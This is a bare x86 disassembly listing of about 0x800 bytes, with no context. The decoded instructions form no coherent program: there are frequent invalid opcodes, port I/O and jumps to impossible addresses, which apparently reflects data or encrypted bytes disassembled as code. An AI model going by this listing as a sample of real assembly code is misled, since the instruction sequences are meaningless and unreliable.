  40320c:	fsubr  QWORD PTR [ecx]
  40320e:	lods   al,BYTE PTR ds:[esi]
  40320f:	(bad)  
  403210:	dec    edx
  403211:	in     al,dx
  403212:	inc    ebx
  403213:	or     ecx,DWORD PTR [ebx-0x76745bc4]
  403219:	mov    eax,0x672aa0f1
  40321e:	cmp    DWORD PTR [edi],ebx
  403220:	call   edx
  403222:	mov    dl,0x41
  403224:	xchg   esi,eax
  403225:	push   ss
  403226:	iret   
  403227:	push   ecx
  403228:	int3   
  403229:	inc    esp
  40322a:	sub    al,0x9d
  40322c:	jmp    0x6a75:0x2797bc02
  403233:	jmp    0xd7387b83
  403238:	inc    edx
  403239:	out    dx,al
  40323a:	(bad)  
  40323c:	in     eax,0x8e
  40323e:	add    dl,ch
  403240:	jg     0x403203
  403242:	jne    0x4031c6
  403244:	imul   ebp,DWORD PTR [edi-0x6b],0x5f
  403248:	add    cl,dh
  40324a:	out    dx,eax
  40324b:	push   edi
  40324c:	pop    esi
  40324d:	std    
  40324e:	push   eax
  40324f:	push   0xffffffdc
  403251:	dec    ebp
  403252:	mov    al,0x85
  403254:	mov    bl,BYTE PTR [eax+eax*8+0x3b]
  403258:	mov    edi,DWORD PTR [edx-0x6037f0c5]
  40325e:	and    dh,BYTE PTR [ecx-0x543ad2dd]
  403264:	leave  
  403265:	and    eax,DWORD PTR [ecx]
  403267:	mov    bl,0x15
  403269:	push   ebx
  40326a:	add    eax,0xb6a78b2c
  40326f:	scas   al,BYTE PTR es:[edi]
  403270:	xor    al,0xe4
  403272:	xchg   esi,eax
  403273:	shl    DWORD PTR ds:0xc2a8c090,0xcf
  40327a:	xor    esi,DWORD PTR [edi+0x31]
  40327d:	scas   eax,DWORD PTR es:[edi]
  40327e:	push   es
  40327f:	add    al,0x6e
  403281:	std    
  403282:	add    DWORD PTR [ebx],0x9b0a66d2
  403288:	push   0xffffffec
  40328a:	sbb    edx,edi
  40328c:	js     0x4032e5
  40328e:	out    0x7f,al
  403290:	or     edi,DWORD PTR [esp+ebx*4+0x4f]
  403294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403295:	jnp    0x4032fc
  403297:	or     DWORD PTR [ebx],0xffffffa5
  40329a:	dec    edx
  40329b:	adc    BYTE PTR [ebx-0x75031707],0xdb
  4032a2:	js     0x40323c
  4032a4:	push   ds
  4032a5:	push   ecx
  4032a6:	jmp    0x831d9529
  4032ab:	out    dx,al
  4032ac:	retf   
  4032ad:	fidivr DWORD PTR [esi+0x5119c936]
  4032b3:	jae    0x4032f3
  4032b5:	xor    eax,0x8e529443
  4032ba:	int    0x9b
  4032bc:	test   al,0x5b
  4032be:	shl    esi,cl
  4032c0:	inc    eax
  4032c1:	icebp  
  4032c2:	lock mov ah,0x70
  4032c5:	pop    ecx
  4032c6:	in     eax,0xed
  4032c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ca:	jecxz  0x40330a
  4032cc:	dec    edi
  4032cd:	push   ecx
  4032ce:	pop    ebp
  4032cf:	stc    
  4032d0:	popf   
  4032d1:	cwde   
  4032d2:	and    ch,BYTE PTR [edx+0x204d1b8f]
  4032d8:	push   edx
  4032d9:	pop    es
  4032da:	fld    st(2)
  4032dc:	into   
  4032dd:	(bad)  
  4032de:	push   ebx
  4032df:	ds imul ecx,ecx,0x65a88144
  4032e6:	mov    ebp,esp
  4032e8:	inc    ebp
  4032e9:	test   BYTE PTR [ebx-0x17],ah
  4032ec:	push   0x3b
  4032ee:	outs   dx,BYTE PTR ds:[esi]
  4032ef:	pop    ebp
  4032f0:	inc    ebp
  4032f1:	xor    eax,0xe006808d
  4032f6:	push   edx
  4032f7:	sar    DWORD PTR [edi],1
  4032f9:	mov    ecx,esp
  4032fb:	jge    0x403373
  4032fd:	xchg   BYTE PTR [edx],bl
  4032ff:	push   ebx
  403300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403301:	mov    edi,0xeb650d98
  403306:	test   eax,0xee7fe64a
  40330b:	fst    DWORD PTR [esi+0x60]
  40330e:	(bad)  
  40330f:	push   edi
  403310:	add    BYTE PTR [ecx+0x58],dh
  403313:	sti    
  403314:	jb     0x40329f
  403316:	test   eax,0xd6c3fed6
  40331b:	cmp    al,0xec
  40331d:	out    0xc5,eax
  40331f:	jmp    0xa4f:0xf129fd23
  403326:	push   es
  403327:	adc    cl,BYTE PTR [edi+0x13500b08]
  40332d:	fwait
  40332e:	jo     0x403328
  403330:	mov    esp,0xced8d06
  403335:	xor    al,0xf9
  403337:	mov    eax,ds:0xb2598117
  40333c:	sub    eax,DWORD PTR [ebx-0x1e70df8]
  403342:	sbb    ch,ah
  403344:	aaa    
  403345:	jae    0x4032f0
  403347:	dec    esp
  403348:	dec    ebp
  403349:	mov    DWORD PTR [ecx+edi*2-0x3003584],esi
  403350:	adc    ecx,ebx
  403352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403353:	inc    edi
  403354:	int3   
  403355:	(bad)  
  403356:	push   0x9afb20a5
  40335b:	inc    esi
  40335c:	jge    0x4033b5
  40335e:	in     eax,dx
  40335f:	popa   
  403360:	stc    
  403361:	out    0x6c,al
  403363:	inc    edx
  403364:	sub    eax,0x6c7dc7c9
  403369:	dec    ebx
  40336a:	push   ebp
  40336c:	jae    0x4033be
  40336e:	dec    eax
  40336f:	mul    BYTE PTR [esi]
  403371:	ret    0x9c
  403374:	out    0x48,al
  403376:	xor    BYTE PTR [ebp-0x4d5afa55],ch
  40337c:	stos   BYTE PTR es:[edi],al
  40337d:	inc    ebx
  40337e:	dec    edi
  40337f:	mov    esi,0x3052cca1
  403384:	inc    esp
  403385:	push   ebp
  403386:	test   BYTE PTR [ebp-0xb0f2de1],cl
  40338c:	jge    0x4033b0
  40338e:	cmp    BYTE PTR [eax],al
  403390:	jb     0x403337
  403392:	mov    ebx,0xe7b2e17f
  403397:	clc    
  403398:	add    eax,0xca36ef81
  40339d:	mov    esi,0x4c3b618a
  4033a2:	sahf   
  4033a3:	adc    eax,0xbb72e4ab
  4033a8:	inc    DWORD PTR [ebx+0x4cd675a6]
  4033ae:	es in  al,0x2d
  4033b1:	cmp    dl,BYTE PTR [esi-0x66230f17]
  4033b7:	or     esp,DWORD PTR [ebp-0x3ab8e85a]
  4033bd:	xlat   BYTE PTR ds:[ebx]
  4033be:	shr    DWORD PTR [edx+0x13],cl
  4033c1:	add    ebp,DWORD PTR ds:0xdc3a4a5f
  4033c7:	and    DWORD PTR [ecx+0x643282b8],ecx
  4033cd:	mov    ebp,0xd290b13c
  4033d2:	loop   0x40339f
  4033d4:	mov    bl,0xd9
  4033d6:	fwait
  4033d7:	ins    DWORD PTR es:[edi],dx
  4033d8:	daa    
  4033d9:	jl     0x403374
  4033db:	hlt    
  4033dc:	push   ss
  4033dd:	retf   0x77a6
  4033e0:	outs   dx,BYTE PTR ds:[esi]
  4033e1:	sub    DWORD PTR [eax+0x633abcfd],ebp
  4033e7:	or     eax,0xf381933d
  4033ec:	dec    ecx
  4033ed:	lods   ax,WORD PTR ds:[esi]
  4033ef:	mov    ah,0xd5
  4033f1:	mov    esi,0x5debba41
  4033f6:	jb     0x403397
  4033f8:	push   DWORD PTR [ecx+0x372af095]
  4033fe:	dec    esi
  4033ff:	scas   al,BYTE PTR es:[edi]
  403400:	sbb    dh,BYTE PTR [edx+0x1a]
  403403:	or     DWORD PTR [ebx-0x4a49f450],esi
  403409:	shr    edi,0xcb
  40340c:	push   DWORD PTR [ebp-0x2c]
  40340f:	in     al,0x53
  403411:	adc    cl,BYTE PTR [ebp+0x4695a3dc]
  403417:	xchg   edi,eax
  403418:	mov    ah,0xee
  40341a:	sbb    BYTE PTR [esp+edx*2-0x50c32267],dl
  403421:	xor    ah,ch
  403423:	or     eax,0x5f8a6f9a
  403428:	pop    edx
  403429:	leave  
  40342a:	test   ebp,edi
  40342c:	pop    es
  40342d:	fwait
  40342e:	push   es
  40342f:	stos   BYTE PTR es:[edi],al
  403430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403431:	fistp  QWORD PTR [ecx-0x48b13e47]
  403437:	xchg   ebx,eax
  403438:	xchg   ebp,eax
  403439:	xor    DWORD PTR [eax+0xc],ebp
  40343c:	push   eax
  40343e:	mov    cl,0x92
  403440:	xchg   esi,eax
  403441:	dec    edx
  403442:	jle    0x40342a
  403444:	push   0x42f4375d
  403449:	push   ebp
  40344a:	mov    edx,0x9d604bc0
  40344f:	cmp    al,0xca
  403451:	test   DWORD PTR [ebx+0x5dfda399],esp
  403457:	mov    ch,BYTE PTR [edx-0x79]
  40345a:	and    eax,0xb6369eb2
  40345f:	hlt    
  403460:	into   
  403461:	inc    ebx
  403462:	jae    0x40344b
  403464:	pop    edx
  403465:	jbe    0x403470
  403467:	push   cs
  403468:	cmp    ch,dl
  40346a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40346b:	and    al,0xd0
  40346d:	loop   0x403400
  40346f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403470:	mov    dl,0xd2
  403472:	push   edi
  403473:	adc    DWORD PTR [edx],edi
  403475:	cmc    
  403476:	ret    0x3355
  403479:	pop    ss
  40347a:	cmp    eax,0x4799ca2b
  40347f:	lock bnd jmp 0x403413
  403483:	cmp    al,0xce
  403485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403486:	out    dx,al
  403487:	jb     0x4034cd
  403489:	aaa    
  40348a:	xor    eax,0xd8580e8c
  40348f:	mov    al,0x65
  403491:	retf   0x47
  403494:	jno    0x403498
  403496:	test   DWORD PTR [edx+0x42],0x162a6081
  40349d:	lea    eax,[edx-0x2b]
  4034a0:	mov    BYTE PTR [ecx+0x62064fe0],dl
  4034a6:	pop    esi
  4034a7:	pop    edx
  4034a8:	test   al,0xd4
  4034aa:	inc    edi
  4034ab:	and    DWORD PTR [ebp-0x638e9abe],esi
  4034b1:	arpl   WORD PTR [esi-0x5],dx
  4034b4:	ret    0xae82
  4034b7:	int    0x1
  4034b9:	stos   DWORD PTR es:[edi],eax
  4034ba:	aaa    
  4034bb:	int    0xb0
  4034bd:	imul   edi,DWORD PTR [ecx-0x60540a45],0x38e24daa
  4034c7:	or     esi,esp
  4034c9:	int3   
  4034ca:	stos   BYTE PTR es:[edi],al
  4034cb:	test   al,0x3f
  4034cd:	mov    al,ds:0x793d8a22
  4034d2:	ds cld 
  4034d4:	bound  esp,QWORD PTR [ebp+0x10]
  4034d7:	mov    dh,0x4e
  4034d9:	or     esp,DWORD PTR [ebp-0x6e]
  4034dc:	popa   
  4034dd:	sti    
  4034de:	cmp    al,0x7b
  4034e0:	cmp    ecx,esp
  4034e2:	sbb    BYTE PTR [edi+0x55],ah
  4034e5:	imul   ecx,DWORD PTR gs:[esi+esi*4+0x27c64199],0xb067d5ec
  4034f1:	inc    esi
  4034f2:	push   ebx
  4034f3:	nop
  4034f4:	dec    esp
  4034f5:	mov    ds:0x1b75d5f2,al
  4034fa:	jmp    0xd1867773
  4034ff:	fcom   DWORD PTR [edx+0x8]
  403502:	je     0x40354e
  403504:	arpl   WORD PTR [edx],di
  403506:	fs mov eax,0xc9e41ea3
  40350c:	test   BYTE PTR [ebx+ecx*2],bh
  40350f:	or     al,0x3f
  403511:	xchg   esi,edi
  403513:	ins    DWORD PTR es:[edi],dx
  403514:	xchg   ebp,eax
  403515:	sub    eax,0xcf63d301
  40351a:	ja     0x403563
  40351c:	xchg   edx,eax
  40351d:	jecxz  0x4034e7
  40351f:	cwde   
  403520:	mov    ecx,0xf8429014
  403525:	out    0x98,eax
  403527:	sbb    eax,0xca8a6d86
  40352c:	and    BYTE PTR [ebx+0x39],cl
  40352f:	mov    ds:0x92ee2051,al
  403534:	xchg   esi,eax
  403535:	add    DWORD PTR [ebx+0x58],ecx
  403538:	cwde   
  403539:	fs or  eax,0x187ccbd0
  40353f:	jo     0x40352b
  403541:	iret   
  403542:	(bad)  
  403543:	das    
  403544:	data16 jbe 0x403546
  403547:	xchg   edi,eax
  403548:	inc    ecx
  403549:	popf   
  40354a:	xchg   DWORD PTR [eax+0xacf4bbe],esp
  403550:	into   
  403551:	mov    dl,0x1c
  403553:	mov    BYTE PTR [edx-0x7a],bl
  403556:	and    al,BYTE PTR [ecx-0x540b8872]
  40355c:	push   ebx
  40355d:	in     eax,0x2b
  40355f:	mov    edi,0x56b75531
  403564:	addr16 sub eax,0x7567f6d4
  40356a:	lods   al,BYTE PTR ds:[esi]
  40356b:	rol    DWORD PTR [ebx-0x2f168130],1
  403571:	stos   DWORD PTR es:[edi],eax
  403572:	test   BYTE PTR [esi],0xf4
  403575:	xor    al,0x4d
  403577:	in     eax,0x8b
  403579:	push   ss
  40357a:	int3   
  40357b:	in     al,0x88
  40357d:	xor    eax,DWORD PTR [ecx+0x50]
  403580:	and    ebx,edi
  403582:	jmp    0xfb1f:0x43877407
  403589:	jmp    0xd7ba2f70
  40358e:	inc    ebp
  40358f:	jecxz  0x4035a8
  403591:	jnp    0x403524
  403593:	scas   eax,DWORD PTR es:[edi]
  403594:	jbe    0x40357d
  403596:	iret   
  403597:	jo     0x403568
  403599:	cmp    BYTE PTR [ebp+0x7176e0fd],0xdf
  4035a0:	hlt    
  4035a1:	pop    eax
  4035a2:	sub    ebp,DWORD PTR ds:0x865c28e9
  4035a8:	out    dx,al
  4035a9:	cmp    edi,esi
  4035ab:	ret    0x3ca9
  4035ae:	shl    BYTE PTR [ebx],cl
  4035b0:	adc    ebx,DWORD PTR [edx-0x115b3100]
  4035b6:	dec    eax
  4035b7:	jecxz  0x403587
  4035b9:	sti    
  4035ba:	push   eax
  4035bb:	inc    esp
  4035bc:	lds    ebx,FWORD PTR [ecx+0x1ec63506]
  4035c2:	pop    ds
  4035c3:	ss cmp dl,bl
  4035c6:	inc    ebx
  4035c7:	xchg   edx,eax
  4035c8:	nop
  4035c9:	or     BYTE PTR [ebx+ebx*1-0x9399a12],ch
  4035d0:	cwde   
  4035d1:	cli    
  4035d2:	jmp    0x75664eb7
  4035d7:	and    edi,DWORD PTR [edx]
  4035d9:	shl    BYTE PTR cs:[esi],1
  4035dc:	ja     0x4035d5
  4035de:	hlt    
  4035df:	ss xchg esi,eax
  4035e1:	add    BYTE PTR [edx+0x10],dl
  4035e4:	pop    ebp
  4035e5:	retf   0x46fd
  4035e8:	xor    eax,0xaf3afd87
  4035ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ee:	int    0x32
  4035f0:	pushf  
  4035f1:	inc    eax
  4035f2:	fcomp  DWORD PTR [edx+0xa003647]
  4035f8:	lock arpl WORD PTR [edi-0x6d],bx
  4035fc:	cwde   
  4035fd:	sahf   
  4035fe:	ds mov esi,0x5c2a1e68
  403604:	push   0x10
  403606:	mov    esi,0x8ca1723a
  40360b:	sbb    DWORD PTR [edi],edi
  40360d:	jmp    0x40368a
  40360f:	ds jmp 0x8022b518
  403615:	rol    DWORD PTR fs:[edx+ebx*1],cl
  403619:	dec    esp
  40361a:	xchg   DWORD PTR [edx+0x51],eax
  40361d:	push   edx
  40361e:	mov    ds:0x2261f29b,al
  403623:	mov    ebx,0x333ad0ad
  403628:	outs   dx,DWORD PTR ds:[esi]
  403629:	jbe    0x403659
  40362b:	cmc    
  40362c:	out    0x89,eax
  40362e:	add    ah,BYTE PTR [esi]
  403630:	popf   
  403631:	mov    eax,0x97d5065d
  403636:	jl     0x40361e
  403638:	sahf   
  403639:	push   edi
  40363a:	mov    eax,ds:0x8620230f
  40363f:	mov    ds:0xa52669c9,al
  403644:	pushf  
  403645:	retf   0x8d05
  403648:	aam    0x56
  40364a:	hlt    
  40364b:	xchg   edi,eax
  40364c:	leave  
  40364d:	out    dx,eax
  40364e:	xchg   edx,eax
  40364f:	mov    ecx,0xba5ca828
  403655:	pop    esi
  403656:	outs   dx,DWORD PTR ds:[esi]
  403657:	nop
  403658:	sub    al,0x8d
  40365a:	mov    al,0x35
  40365c:	gs ss sub al,0xba
  403660:	fistp  DWORD PTR [ebp+0xe]
  403663:	xchg   BYTE PTR [ecx],cl
  403665:	shl    eax,cl
  403667:	pop    edi
  403668:	push   ss
  403669:	clc    
  40366a:	and    esp,0xfffffffb
  40366d:	or     al,0x5e
  40366f:	push   ss
  403670:	ss mov dh,0x5b
  403673:	repnz adc BYTE PTR [ebp-0x5cd3f6ac],0x17
  40367b:	and    esi,ecx
  40367d:	fld1   
  40367f:	loopne 0x4036dd
  403681:	xor    BYTE PTR ds:0xdb9ceac2,dl
  403687:	bnd ja 0x40366a
  40368a:	mov    ecx,DWORD PTR [ecx-0x3d]
  40368d:	xlat   BYTE PTR ds:[ebx]
  40368e:	(bad)  [esp+edx*2]
  403691:	mov    eax,0x9c0b445e
  403696:	pop    ebp
  403697:	ins    DWORD PTR es:[edi],dx
  403698:	jp     0x403653
  40369a:	cmp    BYTE PTR [edi+eax*8+0x54c2ef30],cl
  4036a1:	sub    al,0x98
  4036a3:	inc    esi
  4036a4:	fmul   DWORD PTR [ebx]
  4036a6:	cmp    bh,BYTE PTR [esi+0x4b]
  4036a9:	test   BYTE PTR [ecx+0x2cd2377e],bh
  4036af:	mov    ds:0x114e7fa1,eax
  4036b4:	xchg   ecx,eax
  4036b5:	ror    eax,0x78
  4036b8:	and    esp,ecx
  4036ba:	jge    0x4036db
  4036bc:	mov    al,ds:0xe19684a2
  4036c1:	adc    al,0x8
  4036c3:	pop    ebp
  4036c4:	aas    
  4036c5:	xchg   esi,eax
  4036c6:	cdq    
  4036c7:	imul   eax,DWORD PTR [ecx],0xffffffe7
  4036ca:	xchg   edx,eax
  4036cb:	ficomp DWORD PTR [esi-0x1bda5fbf]
  4036d1:	xchg   DWORD PTR [ebx+0x13b7b7b4],eax
  4036d7:	xor    DWORD PTR [ebp-0xdeb8afc],ebp
  4036dd:	aaa    
  4036de:	inc    edx
  4036df:	pop    ebx
  4036e0:	xchg   ecx,eax
  4036e2:	pop    ss
  4036e3:	sub    eax,0x49862bc9
  4036e8:	cmp    BYTE PTR [edi],dh
  4036ea:	sub    eax,0x3fac1aea
  4036ef:	or     bh,BYTE PTR [ecx-0x2c]
  4036f2:	vmovaps XMMWORD PTR [eax],xmm7
  4036f6:	mov    ebp,0x331b7603
  4036fb:	rcl    BYTE PTR [ebx+0x2b],1
  4036fe:	add    esi,esi
  403700:	push   edi
  403701:	push   cs
  403702:	add    bh,BYTE PTR [ebp-0x717e9485]
  403708:	mov    ds:0x6a16b900,eax
  40370d:	ret    0xfd2f
  403710:	pop    eax
  403711:	jne    0x4036f3
  403713:	aaa    
  403714:	les    eax,FWORD PTR [edx]
  403716:	retf   0x7fc
  403719:	retf   0x8f23
  40371c:	inc    ebx
  40371d:	mov    esi,DWORD PTR [edi-0x11]
  403720:	out    dx,al
  403721:	cmp    al,0x7f
  403723:	push   esi
  403724:	and    eax,0xd5182e70
  403729:	fchs   
  40372b:	in     eax,dx
  40372c:	in     al,dx
  40372d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40372e:	cld    
  40372f:	retf   0xb85a
  403732:	in     al,0x46
  403734:	and    eax,0x2eae2dd6
  403739:	adc    BYTE PTR [ebx],ch
  40373b:	add    al,0x51
  40373d:	cmp    ecx,eax
  40373f:	fwait
  403740:	dec    ecx
  403741:	add    ebp,ebp
  403743:	lahf   
  403744:	adc    eax,0x360b85a7
  403749:	mov    al,0x57
  40374b:	add    eax,0xb1292373
  403750:	jge    0x40378f
  403752:	xchg   DWORD PTR [ebx-0x6a],esp
  403755:	or     eax,0x19a3f557
  40375a:	repz fdivr st,st(7)
  40375d:	pop    ebp
  40375e:	out    0xf3,al
  403760:	and    BYTE PTR [esp+edx*2-0x21],0x5c
  403765:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403767:	add    eax,DWORD PTR ds:[edi-0x44]
  40376b:	adc    bl,BYTE PTR [edx+ebx*4+0x4c3abe90]
  403772:	hlt    
  403773:	jo     0x403786
  403775:	bound  esi,QWORD PTR [edx]
  403777:	call   0xbd0b4889
  40377c:	cmc    
  40377d:	mov    al,ds:0x83c52375
  403782:	cmc    
  403783:	adc    edx,DWORD PTR [ebx]
  403785:	arpl   WORD PTR [edi+0x70c951c0],dx
  40378b:	sbb    esi,edi
  40378d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40378e:	fwait
  40378f:	test   DWORD PTR [esi],0x5bc2c123
  403795:	fs add dl,bh
  403798:	call   0x1cb46d53
  40379d:	jo     0x403818
  40379f:	mov    al,0xde
  4037a1:	ret    
  4037a2:	sub    DWORD PTR [ebx],0x8a36cbd
  4037a8:	out    0x10,al
  4037aa:	in     al,0xd8
  4037ac:	inc    ebx
  4037ad:	icebp  
  4037ae:	mov    al,0x61
  4037b0:	xchg   edi,eax
  4037b1:	sbb    BYTE PTR [edi+0x57],bl
  4037b4:	sbb    BYTE PTR [bx+di],al
  4037b7:	dec    esi
  4037b8:	mov    ds:0x825d6554,eax
  4037bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037be:	jp     0x403791
  4037c0:	sbb    bh,dl
  4037c2:	mov    al,ds:0xc866a8cf
  4037c7:	sub    eax,0xb13b3dd8
  4037cc:	ror    ah,1
  4037ce:	xchg   BYTE PTR [ebp-0x71],dh
  4037d1:	and    al,0x5a
  4037d3:	aam    0xf1
  4037d5:	fdivp  st(3),st
  4037d7:	pusha  
  4037d8:	jmp    0x133a0b60
  4037dd:	cdq    
  4037de:	cld    
  4037df:	adc    al,0xf6
  4037e1:	and    esp,edi
  4037e3:	xor    BYTE PTR [ebx+ebp*8],dh
  4037e6:	lock stc 
  4037e8:	xchg   BYTE PTR [edx+edx*2-0x70],dh
  4037ec:	retf   
  4037ed:	(bad)  
  4037ee:	lock add cl,BYTE PTR [edx+0x42fcbe38]
  4037f5:	mov    dh,0x45
  4037f7:	mov    ecx,0x7224c13b
  4037fc:	pushf  
  4037fd:	mov    bh,0xc7
  4037ff:	jo     0x403842
  403801:	push   ss
  403802:	adc    eax,0x4376bf11
  403807:	fnstsw WORD PTR [ebp-0x2f17fa9d]
  40380d:	ret    0x256b
  403810:	mov    dl,0xdc
  403812:	jmp    0x4037e3
  403814:	aad    0x95
  403816:	sbb    BYTE PTR [edx-0x330bb8ee],dh
  40381c:	cld    
  40381d:	test   eax,0xb9921d02
  403822:	mov    bh,0x21
  403824:	test   DWORD PTR [ebx+0x35],edi
  403827:	sub    dl,ch
  403829:	sub    bl,BYTE PTR [edx+0x12409c43]
  40382f:	mov    eax,ds:0x968d004c
  403834:	push   0xccf91ade
  403839:	inc    esi
  40383a:	adc    esp,DWORD PTR [edx]
  40383c:	push   esi
  40383d:	inc    edi
  40383e:	inc    ebx
  40383f:	sbb    DWORD PTR [edx-0x41],0xf265bbc7
  403846:	xchg   ecx,eax
  403847:	(bad)  
  403849:	xchg   esi,eax
  40384a:	mov    ch,0xd1
  40384c:	xor    al,0xcb
  40384e:	xchg   BYTE PTR [esi-0x53c4bf85],al
  403854:	mov    dh,0xed
  403856:	pusha  
  403857:	pop    ecx
  403858:	lahf   
  403859:	mov    edi,esp
  40385b:	adc    eax,0x902517b8
  403860:	pop    eax
  403861:	inc    ecx
  403862:	jge    0x403812
  403864:	into   
  403865:	stos   BYTE PTR es:[edi],al
  403866:	push   edi
  403867:	mov    dh,0xe2
  403869:	dec    ebx
  40386a:	push   ebp
  40386b:	out    0x85,al
  40386d:	ss in  al,dx
  40386f:	popf   
  403870:	jp     0x4038f0
  403872:	add    al,0xb0
  403874:	mov    edx,edi
  403876:	adc    dh,cl
  403878:	retf   
  403879:	fdivr  DWORD PTR fs:[ecx+0x4f]
  40387d:	xchg   esp,eax
  40387e:	iret   
  40387f:	sub    cl,ah
  403881:	int    0xb0
  403883:	dec    ecx
  403884:	test   DWORD PTR [ebx],0xa90f5388
  40388a:	adc    eax,0x8fd2a25c
  40388f:	push   ecx
  403890:	add    esp,DWORD PTR [ebx]
  403892:	aam    0xad
  403894:	pop    ds
  403895:	push   ds
  403896:	jnp    0x4038bb
  403898:	adc    eax,0x1101e086
  40389d:	add    DWORD PTR [ebx+0x3c],edi
  4038a0:	pop    edx
  4038a1:	xor    al,0xe
  4038a3:	sbb    al,0x83
  4038a5:	jns    0x4038cb
  4038a7:	in     eax,0x2e
  4038a9:	or     esi,DWORD PTR [eax]
  4038ab:	cli    
  4038ac:	add    ebp,edx
  4038ae:	add    BYTE PTR [eax+0x5e],cl
  4038b1:	sub    al,0x13
  4038b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038b4:	add    ebp,esp
  4038b6:	fistp  QWORD PTR [edi]
  4038b8:	push   esi
  4038b9:	clc    
  4038ba:	cli    
  4038bb:	xor    al,0x24
  4038bd:	push   ebx
  4038be:	imul   esp,edi,0x3
  4038c1:	pop    es
  4038c2:	add    eax,0x67795c02
  4038c7:	dec    eax
  4038c8:	ss sub al,0x3f
  4038cb:	sbb    DWORD PTR [ebx],0x2051e909
  4038d1:	xor    eax,0xec8b6bb2
  4038d6:	mov    ds:0x50770537,eax
  4038db:	push   es
  4038dc:	stc    
  4038dd:	adc    al,BYTE PTR [esi]
  4038df:	xor    esi,DWORD PTR [edi]
  4038e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e2:	mov    ecx,0x1eb75445
  4038e7:	xchg   ebp,eax
  4038e8:	dec    esi
  4038e9:	std    
  4038ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038eb:	cmp    DWORD PTR [edx-0x673060d7],esi
  4038f1:	pusha  
  4038f2:	cmp    dl,BYTE PTR [esi+0x7]
  4038f5:	adc    al,0xbd
  4038f7:	mov    eax,ds:0x436fab3a
  4038fc:	imul   edi,DWORD PTR [ebx-0x60],0x67
  403900:	push   edx
  403901:	pop    edx
  403902:	in     al,dx
  403903:	cdq    
  403904:	ja     0x403921
  403906:	jmp    0xbc42:0x603cd328
  40390d:	dec    esi
  40390e:	scas   eax,DWORD PTR es:[edi]
  40390f:	call   FWORD PTR [ecx-0x7995aa2c]
  403915:	mov    ecx,0x704a1fc
  40391a:	imul   esp,DWORD PTR [eax-0x2aab299f],0x31
  403921:	ret    0x672f
  403924:	push   es
  403925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403926:	sbb    dh,BYTE PTR [esi-0x3f14733a]
  40392c:	repnz and al,0x8
  40392f:	ins    DWORD PTR es:[edi],dx
  403930:	cmp    eax,0xecb2342f
  403935:	jle    0x403908
  403937:	dec    esp
  403938:	and    DWORD PTR [edi+0x719667c5],ecx
  40393e:	add    DWORD PTR [ebp+0x48],ebx
  403941:	mov    ds,WORD PTR [ebx]
  403943:	push   DWORD PTR [esi+0xc]
  403946:	xchg   ebx,eax
  403947:	mov    ah,0x5f
  403949:	bound  eax,QWORD PTR [esi+0xcbdf0e6]
  40394f:	mov    ah,0xd4
  403951:	sbb    eax,0xa12fad8e
  403956:	int    0x5d
  403958:	aad    0x1c
  40395a:	adc    eax,0x8a9b133a
  40395f:	push   ecx
  403960:	inc    edx
  403961:	pop    ds
  403962:	(bad)  
  403963:	jno    0x4039bd
  403965:	nop
  403966:	repnz inc ebp
  403968:	xor    DWORD PTR [esi],esi
  40396a:	sub    eax,0xded9b94
  40396f:	stc    
  403970:	(bad)  
  403971:	int3   
  403972:	fcom   DWORD PTR [esi+ecx*2-0x20]
  403976:	nop
  403977:	xor    al,0x35
  403979:	call   0xd438:0x3ccac8ba
  403980:	loop   0x4039be
  403982:	jne    0x40391f
  403984:	pop    ecx
  403985:	in     al,0x36
  403987:	retf   0xecab
  40398a:	outs   dx,BYTE PTR ds:[esi]
  40398b:	pop    esi
  40398c:	outs   dx,DWORD PTR ds:[esi]
  40398d:	sbb    BYTE PTR [ebx-0x791aa42c],bl
  403993:	and    eax,0x5cf0dbc5
  403998:	sbb    eax,0x3a0b1155
  40399d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40399e:	in     eax,dx
  40399f:	or     al,0x89
  4039a1:	adc    eax,ebp
  4039a3:	jno    0x403a23
  4039a5:	cwde   
  4039a6:	div    BYTE PTR [ebx+ebp*8-0x6b]
  4039aa:	sbb    ecx,DWORD PTR [edx]
  4039ac:	xchg   ebx,eax
  4039ad:	in     al,dx
  4039ae:	jne    0x4039e8
  4039b0:	test   al,0x8f
  4039b2:	pop    ds
  4039b3:	loopne 0x403978
  4039b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b6:	inc    esp
  4039b7:	xor    DWORD PTR [edi+edx*8+0x70ef95f6],eax
  4039be:	cmp    bh,al
  4039c0:	fld    DWORD PTR ds:0xa02d2ed2
  4039c6:	add    ecx,esi
  4039c8:	rcl    cl,1
  4039ca:	scas   al,BYTE PTR es:[edi]
  4039cb:	jnp    0x4039ac
  4039cd:	add    eax,0xd9926ef8
  4039d2:	ret    0x70e1
  4039d5:	(bad)  
  4039d6:	rol    DWORD PTR [ecx+0x1c],1
  4039d9:	fimul  DWORD PTR [esi+0xa]
  4039dc:	jne    0x40396c
  4039de:	pop    edx
  4039df:	pusha  
  4039e0:	(bad)  
  4039e2:	mov    WORD PTR [edx],cs
  4039e4:	push   0x2d7d7fa6
  4039e9:	xor    edi,ebx
  4039eb:	shl    bh,cl
  4039ed:	and    DWORD PTR [eax+0x495f45a8],edi
  4039f3:	xor    edi,DWORD PTR [edi]
  4039f5:	and    eax,0x7c3caae7
  4039fa:	or     al,0x78
  4039fc:	jbe    0x4039e0
  4039fe:	ror    BYTE PTR [edi+0xa],0x7
  403a02:	adc    al,0x45
